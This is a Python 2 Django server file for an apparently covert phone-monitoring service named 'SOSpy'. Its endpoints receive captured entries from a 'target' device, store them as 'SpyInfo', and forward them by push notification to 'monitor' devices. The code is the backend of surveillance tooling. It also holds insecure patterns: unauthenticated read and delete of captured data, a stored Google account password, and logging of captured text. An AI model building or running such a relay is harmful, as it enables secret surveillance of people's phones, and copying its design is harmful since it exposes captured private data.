import logging
logging.getLogger().setLevel(logging.DEBUG)
from django.http import HttpResponse, HttpResponseNotFound, HttpResponseRedirect, HttpResponseBadRequest, HttpResponseServerError
from django.utils import simplejson
from django.shortcuts import get_object_or_404
from django.core.urlresolvers import reverse
from google.appengine.api import users
import datetime, time

C2DMUSER = "sospyc2dm@gmail.com"
REGISTRATION_STRING = "SOSPYREGISTER"

from models import MonitorDevice, TargetDevice, SpyInfo, C2DMInfo

def spy(request, devid=None):
    """
    POSTs a new piece of data
    GETS data for a particular target
    DELETE deletes all data for that device
    """

    if request.method == "GET":
        try:
            targetDevice = TargetDevice.objects.get(Uuid = devid)
        except TargetDevice.DoesNotExist:
            return HttpResponse("No Such Device", content_type="text/plain")
        
        infos = SpyInfo.objects.filter(device = targetDevice)


        return direct_to_template(request, "api/spy.html", {'info_list' : infos, 'devid' : devid})

    elif request.method == "POST":
        logging.info("a spy POST")

        if not devid:
            #Why u no provide ID?
            return HttpResponseBadRequest("Bad Request", content_type="text/plain")

        title = request.POST.get("title", "title")
        text = request.POST.get("text","text")
        try:
            #datetime from android is in int(microseconds), while datetime wants float(milliseconds)
            date= datetime.datetime.utcfromtimestamp(float(request.POST["datetime"])/1000.)
        except Exception, e:
            #if the datetime is malformed, use current time
            date = datetime.datetime.utcfromtimestamp(time.time())
        logging.info("Title: " + title)
        logging.info("Text: " + text)
        logging.info("datetime: " + str(date.timetuple()))
        try:
            #this TargetDevice is not new
            device = TargetDevice.objects.get(Uuid = devid)
            logging.info("Welcome back.." + devid)
        except TargetDevice.DoesNotExist:
            device = TargetDevice(Uuid = devid)
            logging.info("This is a new device: " + devid)
            device.save()

        if title != REGISTRATION_STRING:
            #Don't save this if it's the registration string
            info = SpyInfo(device = device, title = title, text = text, datetime = date)
            info.save()
            #Notify listeners for this device
            notify(info)

        return HttpResponse()

    elif request.method == "DELETE":

        #delete given device
        try:
            device = TargetDevice.objects.get(Uuid = devid)
            infos = device.spyinfo_set.all().delete()
        except TargetDevice.DoesNotExist:
            return HttpResponseBadRequest("Device does not exist")
        return HttpResponse("Deleted", content_type="text/plain")

    else:
        return HttpResponse("Bad Request", content_type="text/plain")


def register(request):

    
    if request.method == "POST":
        logging.info("a spy POST")

        c2dmID = request.POST.get("deviceRegID", None)
        sospyid = request.POST.get("sospyid", None)
        uuid = request.POST.get("uuid", None)
        if not sospyid or not c2dmID or not uuid:
            #Must register a sospyid
            return HttpResponseBadRequest()
        logging.info("C2DMID: " + c2dmID)
        logging.info("SOSpyID: " + sospyid)
        logging.info("uuid: " + uuid)

        try:
            try:
                #If they are reregistering this ID, update the c2dmid/sospyid
                device = MonitorDevice.objects.get(Uuid = uuid)
                logging.info("Updating an existing device")
                device.C2DMID = c2dmID
                spydevice = TargetDevice.objects.get(Uuid = sospyid)

                device.sospyid = spydevice
            except MonitorDevice.DoesNotExist:
                spydevice = TargetDevice.objects.get(Uuid = sospyid)

                device = MonitorDevice(Uuid = uuid, C2DMID = c2dmID, sospyid = spydevice)
                logging.info("Created device, uuid: %s c2dmid %s sospyid %s" % (device.Uuid, device.C2DMID, device.sospyid ))
            device.save()
            return HttpResponse( "Uuid: %s C2DMID: %s SOSpyID: %s" % (device.Uuid, device.C2DMID, device.sospyid))
        except TargetDevice.DoesNotExist:
            logging.info("The sospyid %s does not exist" % sospyid)
            return HttpResponseNotFound()

            return HttpResponse( "Uuid: %s C2DMID: %s SOSpyID: %s" % (device.Uuid, device.C2DMID, device.sospyid))
    return HttpResponseBadRequest()
        



from django.core.urlresolvers import reverse
from django.views.generic.simple import direct_to_template

import urllib
import urllib2

def notify(info):

    logging.info("Notifying")

    monDevices = info.device.monitordevice_set.all()
    #monDevices =  MonitorDevice.objects.filter(sospyid = spyDevice)

    for device in monDevices:
        logging.info("Notifying device %s" % (device.Uuid))

        c2dmUser = C2DMInfo.objects.get(user=C2DMUSER)
        authToken = c2dmUser.authtoken

        try:
            notifyHelper(device,info,authToken)
        except urllib2.HTTPError, e:
            #Token expired, get a new one
            if e.code == 401:
                logging.error("Auth expired")
                newToken = get_google_authtoken(c2dmUser.user, c2dmUser.password)
                logging.error("new token: " + newToken)
                c2dmUser.authtoken = newToken
                c2dmUser.save()
                return notifyHelper(device, info, newToken)
            else:
                raise



def notifyHelper(device, info, authtoken):
    responses = []
    values = {
            'data.title' : info.title, # info title
            'data.text' : info.text, # info text
            'data.date' : int(info.datetime.strftime("%s"))*1000, # datetime in ms
            'registration_id' : device.C2DMID,
            'collapse_key' : info.text 
            }
    body = urllib.urlencode(values)
    request = urllib2.Request('http://android.clients.google.com/c2dm/send', body)
    request.add_header('Authorization', 'GoogleLogin auth=' + authtoken)
    response = urllib2.urlopen(request) 
    logging.info("Notified %s UUID: %s" % (device.C2DMID, device.Uuid))
    logging.info("Response Code: " + str(response.code))

    if (response.code != 200):
        logging.error("There was an error in the C2DM process")

def get_google_authtoken(email_address, password):
    """
    Make secure connection to Google Accounts and retrieve an authorisation
    token for the stated appname.
    """
    #opener = get_opener()

    # get an AuthToken from Google accounts
    auth_uri = 'https://www.google.com/accounts/ClientLogin'
    authreq_data = urllib.urlencode({ "Email":   email_address,
        "Passwd":  password,
        "service": "ac2dm",
        "source":  "sospyer",
        "accountType": "HOSTED_OR_GOOGLE" })
    req = urllib2.Request(auth_uri, data=authreq_data)
    response = urllib2.urlopen(req)
    #response = opener.open(req)
    response_body = response.read()
    response_dict = dict(x.split("=")
            for x in response_body.split("\n") if x)
    return response_dict["Auth"]


